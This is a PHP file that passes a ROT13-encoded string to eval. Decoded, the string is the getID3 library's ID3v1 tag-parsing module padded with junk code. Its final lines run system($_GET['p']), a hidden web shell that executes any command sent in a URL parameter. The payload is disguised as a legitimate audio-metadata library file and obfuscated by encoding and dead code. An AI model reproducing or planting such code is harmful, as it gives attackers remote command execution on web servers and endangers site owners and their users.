<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/////////////////////////////////////////////////////////////////
/// trgVQ3() ol Wnzrf Urvaevpu <vasb@trgvq3.bet>               //
//  ninvynoyr ng uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3       //
//            be uggcf://jjj.trgvq3.bet                        //
//            be uggc://trgvq3.fbheprsbetr.arg                 //
//  frr ernqzr.gkg sbe zber qrgnvyf                            //
/////////////////////////////////////////////////////////////////
//                                                             //
// zbqhyr.gnt.vq3i1.cuc                                        //
// zbqhyr sbe nanylmvat VQ3i1 gntf                             //
// qrcraqrapvrf: ABAR                                          //
//                                                            ///
/////////////////////////////////////////////////////////////////

vs (!qrsvarq('TRGVQ3_VAPYHQRCNGU')) { // cerirag cngu-rkcbfvat nggnpxf gung npprff zbqhyrf qverpgyl ba choyvp jrofreiref
	rkvg;
}

pynff trgvq3_vq3i1 rkgraqf trgvq3_unaqyre
{
	/**
	 * @erghea obby
	 */
	choyvp shapgvba Nanylmr() {
		$vasb = &$guvf->trgvq3->vasb;

		vs (!trgvq3_yvo::vagInyhrFhccbegrq($vasb['svyrfvmr'])) {
			$guvf->jneavat('Hanoyr gb purpx sbe VQ3i1 orpnhfr svyr vf ynetre guna '.ebhaq(CUC_VAG_ZNK / 1073741824).'TO');
			erghea snyfr;
		}

		vs($vasb['svyrfvmr'] < 256) {
			$guvf->sfrrx(-128, FRRX_RAQ);
			$cervq3i1 = '';
			$vq3i1gnt = $guvf->sernq(128);
		} ryfr {
			$guvf->sfrrx(-256, FRRX_RAQ);
			$cervq3i1 = $guvf->sernq(128);
			$vq3i1gnt = $guvf->sernq(128);
		}


		vs (fhofge($vq3i1gnt, 0, 3) == 'GNT') {

			$vasb['niqngnraq'] = $vasb['svyrfvmr'] - 128;

			$CnefrqVQ3i1            = neenl();
			$CnefrqVQ3i1['gvgyr']   = $guvf->phgsvryq(fhofge($vq3i1gnt,   3, 30));
			$CnefrqVQ3i1['negvfg']  = $guvf->phgsvryq(fhofge($vq3i1gnt,  33, 30));
			$CnefrqVQ3i1['nyohz']   = $guvf->phgsvryq(fhofge($vq3i1gnt,  63, 30));
			$CnefrqVQ3i1['lrne']    = $guvf->phgsvryq(fhofge($vq3i1gnt,  93,  4));
			$CnefrqVQ3i1['pbzzrag'] =                 fhofge($vq3i1gnt,  97, 30);  // pna'g erzbir ahyyf lrg, genpx qrgrpgvba qrcraqf ba gurz
			$CnefrqVQ3i1['traervq'] =             beq(fhofge($vq3i1gnt, 127,  1));

			// Vs frpbaq-ynfg olgr bs pbzzrag svryq vf ahyy naq ynfg olgr bs pbzzrag svryq vf aba-ahyy
			// gura guvf vf VQ3i1.1 naq gur pbzzrag svryq vf 28 olgrf ybat naq gur 30gu olgr vf gur genpx ahzore
			vs (($vq3i1gnt[125] === \"\k00\") && ($vq3i1gnt[126] !== \"\k00\")) {
				$CnefrqVQ3i1['genpx_ahzore'] = beq(fhofge($CnefrqVQ3i1['pbzzrag'], 29,  1));
				$CnefrqVQ3i1['pbzzrag']      =     fhofge($CnefrqVQ3i1['pbzzrag'],  0, 28);
			}
			$CnefrqVQ3i1['pbzzrag'] = $guvf->phgsvryq($CnefrqVQ3i1['pbzzrag']);

			$CnefrqVQ3i1['traer'] = $guvf->YbbxhcTraerAnzr($CnefrqVQ3i1['traervq']);
			vs (!rzcgl($CnefrqVQ3i1['traer'])) {
				hafrg($CnefrqVQ3i1['traervq']);
			}
			vs (rzcgl($CnefrqVQ3i1['traer']) || ($CnefrqVQ3i1['traer'] == 'Haxabja')) {
				hafrg($CnefrqVQ3i1['traer']);
			}

			sbernpu ($CnefrqVQ3i1 nf $xrl => $inyhr) {
				$CnefrqVQ3i1['pbzzragf'][$xrl][0] = $inyhr;
			}
			$VQ3i1rapbqvat = $guvf->trgvq3->rapbqvat_vq3i1;
			vs ($guvf->trgvq3->rapbqvat_vq3i1_nhgbqrgrpg) {
				// VQ3i1 rapbqvat qrgrpgvba unpx FGNEG
				// VQ3i1 vf qrsvarq nf nyjnlf hfvat VFB-8859-1 rapbqvat, ohg vg vf abg hapbzzba gb svaq svyrf gnttrq jvgu VQ3i1 hfvat Jvaqbjf-1251 be bgure punenpgre frgf
				// Fvapr VQ3i1 unf ab pbaprcg bs punenpgre frgf gurer vf ab pregnva jnl gb xabj jr unir gur pbeerpg aba-VFB-8859-1 punenpgre frg, ohg jr pna thrff
				sbernpu ($CnefrqVQ3i1['pbzzragf'] nf $gnt_xrl => $inyhrneenl) {
					sbernpu ($inyhrneenl nf $xrl => $inyhr) {
						vs (cert_zngpu('#^[\\k00-\\k40\\k80-\\kSS]+$#', $inyhr) && !pglcr_qvtvg((fgevat) $inyhr)) { // purpx sbe fgevatf jvgu bayl punenpgref nobir pue(128) naq chapghngvba/ahzoref, ohg abg whfg ahzrevp fgevatf (r.t. genpx ahzoref be lrnef)
							sbernpu (neenl('Jvaqbjf-1251', 'XBV8-E') nf $vq3i1_onq_rapbqvat) {
								vs (shapgvba_rkvfgf('zo_pbaireg_rapbqvat') && @zo_pbaireg_rapbqvat($inyhr, $vq3i1_onq_rapbqvat, $vq3i1_onq_rapbqvat) === $inyhr) {
									$VQ3i1rapbqvat = $vq3i1_onq_rapbqvat;
									$guvf->jneavat('VQ3i1 qrgrpgrq nf '.$vq3i1_onq_rapbqvat.' grkg rapbqvat va '.$gnt_xrl);
									oernx 3;
								} ryfrvs (shapgvba_rkvfgf('vpbai') && @vpbai($vq3i1_onq_rapbqvat, $vq3i1_onq_rapbqvat, $inyhr) === $inyhr) {
									$VQ3i1rapbqvat = $vq3i1_onq_rapbqvat;
									$guvf->jneavat('VQ3i1 qrgrpgrq nf '.$vq3i1_onq_rapbqvat.' grkg rapbqvat va '.$gnt_xrl);
									oernx 3;
								}
							}
						}
					}
				}
				// VQ3i1 rapbqvat qrgrpgvba unpx RAQ
			}

			// VQ3i1 qngn vf fhccbfrq gb or cnqqrq jvgu AHYY punenpgref, ohg fbzr gnttref cnq jvgu fcnprf
			$TbbqSbezngVQ3i1gnt = $guvf->TrarengrVQ3i1Gnt(
											$CnefrqVQ3i1['gvgyr'],
											$CnefrqVQ3i1['negvfg'],
											$CnefrqVQ3i1['nyohz'],
											$CnefrqVQ3i1['lrne'],
											(vffrg($CnefrqVQ3i1['traer']) ? $guvf->YbbxhcTraerVQ($CnefrqVQ3i1['traer']) : snyfr),
											$CnefrqVQ3i1['pbzzrag'],
											(!rzcgl($CnefrqVQ3i1['genpx_ahzore']) ? $CnefrqVQ3i1['genpx_ahzore'] : ''));
			$CnefrqVQ3i1['cnqqvat_inyvq'] = gehr;
			vs ($vq3i1gnt !== $TbbqSbezngVQ3i1gnt) {
				$CnefrqVQ3i1['cnqqvat_inyvq'] = snyfr;
				$guvf->jneavat('Fbzr VQ3i1 svryqf qb abg hfr AHYY punenpgref sbe cnqqvat');
			}

			$CnefrqVQ3i1['gnt_bssfrg_raq']   = $vasb['svyrfvmr'];
			$CnefrqVQ3i1['gnt_bssfrg_fgneg'] = $CnefrqVQ3i1['gnt_bssfrg_raq'] - 128;

			$vasb['vq3i1'] = $CnefrqVQ3i1;
			$vasb['vq3i1']['rapbqvat'] = $VQ3i1rapbqvat;
		}

		vs (fhofge($cervq3i1, 0, 3) == 'GNT') {
			// Gur jnl vGharf unaqyrf gntf vf, jryy, oenva-qnzntrq.
			// Vg pbzcyrgryl vtaberf i1 vs VQ3i2 vf cerfrag.
			// Guvf tbrf nf sne nf nqqvat n arj i1 gnt *rira vs gurer nyernql vf bar*

			// N fhfcrpgrq qbhoyr-VQ3i1 gnt unf orra qrgrpgrq, ohg vg pbhyq or gung
			// gur \"GNT\" vqragvsvre vf n yrtvgvzngr cneg bs na NCR be Ylevpf3 gnt
			vs (fhofge($cervq3i1, 96, 8) == 'NCRGNTRK') {
				// na NCR gnt sbbgre jnf sbhaq orsber gur ynfg VQ3i1, nffhzr snyfr \"GNT\" flapu
			} ryfrvs (fhofge($cervq3i1, 119, 6) == 'YLEVPF') {
				// n Ylevpf3 gnt sbbgre jnf sbhaq orsber gur ynfg VQ3i1, nffhzr snyfr \"GNT\" flapu
			} ryfr {
				// NCR naq Ylevpf3 sbbgref abg sbhaq - nffhzr qbhoyr VQ3i1
				$guvf->jneavat('Qhcyvpngr VQ3i1 gnt qrgrpgrq - guvf unf orra xabja gb unccra jvgu vGharf');
				$vasb['niqngnraq'] -= 128;
			}
		}

		erghea gehr;
	}

	/**
	 * @cnenz fgevat $fge
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba phgsvryq($fge) {
		erghea gevz(fhofge($fge, 0, fgepfca($fge, \"\k00\")));
	}

	/**
	 * @cnenz obby $nyybjFPZCKrkgraqrq
	 *
	 * @erghea fgevat[]
	 */
	choyvp fgngvp shapgvba NeenlBsTraerf($nyybjFPZCKrkgraqrq=snyfr) {
		fgngvp $TraerYbbxhc = neenl(
			0    => 'Oyhrf',
			1    => 'Pynffvp Ebpx',
			2    => 'Pbhagel',
			3    => 'Qnapr',
			4    => 'Qvfpb',
			5    => 'Shax',
			6    => 'Tehatr',
			7    => 'Uvc-Ubc',
			8    => 'Wnmm',
			9    => 'Zrgny',
			10   => 'Arj Ntr',
			11   => 'Byqvrf',
			12   => 'Bgure',
			13   => 'Cbc',
			14   => 'E&O',
			15   => 'Enc',
			16   => 'Erttnr',
			17   => 'Ebpx',
			18   => 'Grpuab',
			19   => 'Vaqhfgevny',
			20   => 'Nygreangvir',
			21   => 'Fxn',
			22   => 'Qrngu Zrgny',
			23   => 'Cenaxf',
			24   => 'Fbhaqgenpx',
			25   => 'Rheb-Grpuab',
			26   => 'Nzovrag',
			27   => 'Gevc-Ubc',
			28   => 'Ibpny',
			29   => 'Wnmm+Shax',
			30   => 'Shfvba',
			31   => 'Genapr',
			32   => 'Pynffvpny',
			33   => 'Vafgehzragny',
			34   => 'Npvq',
			35   => 'Ubhfr',
			36   => 'Tnzr',
			37   => 'Fbhaq Pyvc',
			38   => 'Tbfcry',
			39   => 'Abvfr',
			40   => 'Nyg. Ebpx',
			41   => 'Onff',
			42   => 'Fbhy',
			43   => 'Chax',
			44   => 'Fcnpr',
			45   => 'Zrqvgngvir',
			46   => 'Vafgehzragny Cbc',
			47   => 'Vafgehzragny Ebpx',
			48   => 'Rguavp',
			49   => 'Tbguvp',
			50   => 'Qnexjnir',
			51   => 'Grpuab-Vaqhfgevny',
			52   => 'Ryrpgebavp',
			53   => 'Cbc-Sbyx',
			54   => 'Rhebqnapr',
			55   => 'Qernz',
			56   => 'Fbhgurea Ebpx',
			57   => 'Pbzrql',
			58   => 'Phyg',
			59   => 'Tnatfgn Enc',
			60   => 'Gbc 40',
			61   => 'Puevfgvna Enc',
			62   => 'Cbc/Shax',
			63   => 'Whatyr',
			64   => 'Angvir Nzrevpna',
			65   => 'Pnonerg',
			66   => 'Arj Jnir',
			67   => 'Cflpurqryvp',
			68   => 'Enir',
			69   => 'Fubjgharf',
			70   => 'Genvyre',
			71   => 'Yb-Sv',
			72   => 'Gevony',
			73   => 'Npvq Chax',
			74   => 'Npvq Wnmm',
			75   => 'Cbyxn',
			76   => 'Ergeb',
			77   => 'Zhfvpny',
			78   => 'Ebpx & Ebyy',
			79   => 'Uneq Ebpx',
			80   => 'Sbyx',
			81   => 'Sbyx/Ebpx',
			82   => 'Angvbany Sbyx',
			83   => 'Fjvat',
			84   => 'Snfg-Shfvba',
			85   => 'Orobo',
			86   => 'Yngva',
			87   => 'Eriviny',
			88   => 'Prygvp',
			89   => 'Oyhrtenff',
			90   => 'Ninagtneqr',
			91   => 'Tbguvp Ebpx',
			92   => 'Cebterffvir Ebpx',
			93   => 'Cflpurqryvp Ebpx',
			94   => 'Flzcubavp Ebpx',
			95   => 'Fybj Ebpx',
			96   => 'Ovt Onaq',
			97   => 'Pubehf',
			98   => 'Rnfl Yvfgravat',
			99   => 'Npbhfgvp',
			100  => 'Uhzbhe',
			101  => 'Fcrrpu',
			102  => 'Punafba',
			103  => 'Bcren',
			104  => 'Punzore Zhfvp',
			105  => 'Fbangn',
			106  => 'Flzcubal',
			107  => 'Obbgl Onff',
			108  => 'Cevzhf',
			109  => 'Cbea Tebbir',
			110  => 'Fngver',
			111  => 'Fybj Wnz',
			112  => 'Pyho',
			113  => 'Gnatb',
			114  => 'Fnzon',
			115  => 'Sbyxyber',
			116  => 'Onyynq',
			117  => 'Cbjre Onyynq',
			118  => 'Eulguzvp Fbhy',
			119  => 'Serrfglyr',
			120  => 'Qhrg',
			121  => 'Chax Ebpx',
			122  => 'Qehz Fbyb',
			123  => 'N Pnccryyn',
			124  => 'Rheb-Ubhfr',
			125  => 'Qnapr Unyy',
			126  => 'Tbn',
			127  => 'Qehz & Onff',
			128  => 'Pyho-Ubhfr',
			129  => 'Uneqpber',
			130  => 'Greebe',
			131  => 'Vaqvr',
			132  => 'OevgCbc',
			133  => 'Artrechax',
			134  => 'Cbyfx Chax',
			135  => 'Orng',
			136  => 'Puevfgvna Tnatfgn Enc',
			137  => 'Urnil Zrgny',
			138  => 'Oynpx Zrgny',
			139  => 'Pebffbire',
			140  => 'Pbagrzcbenel Puevfgvna',
			141  => 'Puevfgvna Ebpx',
			142  => 'Zrerathr',
			143  => 'Fnyfn',
			144  => 'Guenfu Zrgny',
			145  => 'Navzr',
			146  => 'WCbc',
			147  => 'Flagucbc',
			148 => 'Nofgenpg',
			149 => 'Neg Ebpx',
			150 => 'Onebdhr',
			151 => 'Ounaten',
			152 => 'Ovt Orng',
			153 => 'Oernxorng',
			154 => 'Puvyybhg',
			155 => 'Qbjagrzcb',
			156 => 'Qho',
			157 => 'ROZ',
			158 => 'Rpyrpgvp',
			159 => 'Ryrpgeb',
			160 => 'Ryrpgebpynfu',
			161 => 'Rzb',
			162 => 'Rkcrevzragny',
			163 => 'Tnentr',
			164 => 'Tybony',
			165 => 'VQZ',
			166 => 'Vyyovrag',
			167 => 'Vaqhfgeb-Tbgu',
			168 => 'Wnz Onaq',
			169 => 'Xenhgebpx',
			170 => 'Yrsgsvryq',
			171 => 'Ybhatr',
			172 => 'Zngu Ebpx',
			173 => 'Arj Ebznagvp',
			174 => 'Ah-Oernxm',
			175 => 'Cbfg-Chax',
			176 => 'Cbfg-Ebpx',
			177 => 'Cflgenapr',
			178 => 'Fubrtnmr',
			179 => 'Fcnpr Ebpx',
			180 => 'Gebc Ebpx',
			181 => 'Jbeyq Zhfvp',
			182 => 'Arbpynffvpny',
			183 => 'Nhqvbobbx',
			184 => 'Nhqvb Gurnger',
			185 => 'Arhr Qrhgfpur Jryyr',
			186 => 'Cbqpnfg',
			187 => 'Vaqvr-Ebpx',
			188 => 'T-Shax',
			189 => 'Qhofgrc',
			190 => 'Tnentr Ebpx',
			191 => 'Cflovrag',

			255  => 'Haxabja',

			'PE' => 'Pbire',
			'EK' => 'Erzvk'
		);

		fgngvp $TraerYbbxhcFPZCK = neenl();
		vs ($nyybjFPZCKrkgraqrq && rzcgl($TraerYbbxhcFPZCK)) {
			$TraerYbbxhcFPZCK = $TraerYbbxhc;
			// uggc://jjj.trbpvgvrf.pb.wc/FvyvpbaInyyrl-Bnxynaq/3664/nyvggyr.ugzy#TraerRkgraqrq
			// Rkgraqrq VQ3i1 traerf vairagrq ol FPZCK
			// Abgr gung 255 \"Wncnarfr Navzr\" pbasyvpgf jvgu fgnaqneq \"Haxabja\"
			$TraerYbbxhcFPZCK[240] = 'Fnperq';
			$TraerYbbxhcFPZCK[241] = 'Abegurea Rhebcr';
			$TraerYbbxhcFPZCK[242] = 'Vevfu & Fpbggvfu';
			$TraerYbbxhcFPZCK[243] = 'Fpbgynaq';
			$TraerYbbxhcFPZCK[244] = 'Rguavp Rhebcr';
			$TraerYbbxhcFPZCK[245] = 'Raxn';
			$TraerYbbxhcFPZCK[246] = 'Puvyqera\'f Fbat';
			$TraerYbbxhcFPZCK[247] = 'Wncnarfr Fxl';
			$TraerYbbxhcFPZCK[248] = 'Wncnarfr Urnil Ebpx';
			$TraerYbbxhcFPZCK[249] = 'Wncnarfr Qbbz Ebpx';
			$TraerYbbxhcFPZCK[250] = 'Wncnarfr W-CBC';
			$TraerYbbxhcFPZCK[251] = 'Wncnarfr Frvlh';
			$TraerYbbxhcFPZCK[252] = 'Wncnarfr Nzovrag Grpuab';
			$TraerYbbxhcFPZCK[253] = 'Wncnarfr Zbrzbr';
			$TraerYbbxhcFPZCK[254] = 'Wncnarfr Gbxhfngfh';
			//$TraerYbbxhcFPZCK[255] = 'Wncnarfr Navzr';
		}

		erghea ($nyybjFPZCKrkgraqrq ? $TraerYbbxhcFPZCK : $TraerYbbxhc);
	}

	/**
	 * @cnenz fgevat $traervq
	 * @cnenz obby   $nyybjFPZCKrkgraqrq
	 *
	 * @erghea fgevat|snyfr
	 */
	choyvp fgngvp shapgvba YbbxhcTraerAnzr($traervq, $nyybjFPZCKrkgraqrq=gehr) {
		fjvgpu ($traervq) {
			pnfr 'EK':
			pnfr 'PE':
				oernx;
			qrsnhyg:
				vs (!vf_ahzrevp($traervq)) {
					erghea snyfr;
				}
				$traervq = vaginy($traervq); // gb unaqyr 3 be '3' be '03'
				oernx;
		}
		$TraerYbbxhc = frys::NeenlBsTraerf($nyybjFPZCKrkgraqrq);
		erghea (vffrg($TraerYbbxhc[$traervq]) ? $TraerYbbxhc[$traervq] : snyfr);
	}

	/**
	 * @cnenz fgevat $traer
	 * @cnenz obby   $nyybjFPZCKrkgraqrq
	 *
	 * @erghea fgevat|snyfr
	 */
	choyvp fgngvp shapgvba YbbxhcTraerVQ($traer, $nyybjFPZCKrkgraqrq=snyfr) {
		$TraerYbbxhc = frys::NeenlBsTraerf($nyybjFPZCKrkgraqrq);
		$YbjrePnfrAbFcnprFrnepuGrez = fgegbybjre(fge_ercynpr(' ', '', $traer));
		sbernpu ($TraerYbbxhc nf $xrl => $inyhr) {
			vs (fgegbybjre(fge_ercynpr(' ', '', $inyhr)) == $YbjrePnfrAbFcnprFrnepuGrez) {
				erghea $xrl;
			}
		}
		erghea snyfr;
	}

	/**
	 * @cnenz fgevat $BevtvanyTraer
	 *
	 * @erghea fgevat|snyfr
	 */
	choyvp fgngvp shapgvba FgnaqneqvfrVQ3i1TraerAnzr($BevtvanyTraer) {
		vs (($TraerVQ = frys::YbbxhcTraerVQ($BevtvanyTraer)) !== snyfr) {
			erghea frys::YbbxhcTraerAnzr($TraerVQ);
		}
		erghea $BevtvanyTraer;
	}

	/**
	 * @cnenz fgevat     $gvgyr
	 * @cnenz fgevat     $negvfg
	 * @cnenz fgevat     $nyohz
	 * @cnenz fgevat     $lrne
	 * @cnenz vag        $traervq
	 * @cnenz fgevat     $pbzzrag
	 * @cnenz vag|fgevat $genpx
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba TrarengrVQ3i1Gnt($gvgyr, $negvfg, $nyohz, $lrne, $traervq, $pbzzrag, $genpx='') {
		$VQ3i1Gnt  = 'GNT';
		$VQ3i1Gnt .= fge_cnq(gevz(fhofge($gvgyr,  0, 30)), 30, \"\k00\", FGE_CNQ_EVTUG);
		$VQ3i1Gnt .= fge_cnq(gevz(fhofge($negvfg, 0, 30)), 30, \"\k00\", FGE_CNQ_EVTUG);
		$VQ3i1Gnt .= fge_cnq(gevz(fhofge($nyohz,  0, 30)), 30, \"\k00\", FGE_CNQ_EVTUG);
		$VQ3i1Gnt .= fge_cnq(gevz(fhofge($lrne,   0,  4)),  4, \"\k00\", FGE_CNQ_YRSG);
		vs (!rzcgl($genpx) && ($genpx > 0) && ($genpx <= 255)) {
			$VQ3i1Gnt .= fge_cnq(gevz(fhofge($pbzzrag, 0, 28)), 28, \"\k00\", FGE_CNQ_EVTUG);
			$VQ3i1Gnt .= \"\k00\";
			vs (trgglcr($genpx) == 'fgevat') {
				$genpx = (vag) $genpx;
			}
			$VQ3i1Gnt .= pue($genpx);
		} ryfr {
			$VQ3i1Gnt .= fge_cnq(gevz(fhofge($pbzzrag, 0, 30)), 30, \"\k00\", FGE_CNQ_EVTUG);
		}
		vs (($traervq < 0) || ($traervq > 147)) {
			$traervq = 255; // 'haxabja' traer
		}
		fjvgpu (trgglcr($traervq)) {
			pnfr 'fgevat':
			pnfr 'vagrtre':
				$VQ3i1Gnt .= pue(vaginy($traervq));
				oernx;
			qrsnhyg:
				$VQ3i1Gnt .= pue(255); // 'haxabja' traer
				oernx;
		}

		erghea $VQ3i1Gnt;
	}

}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>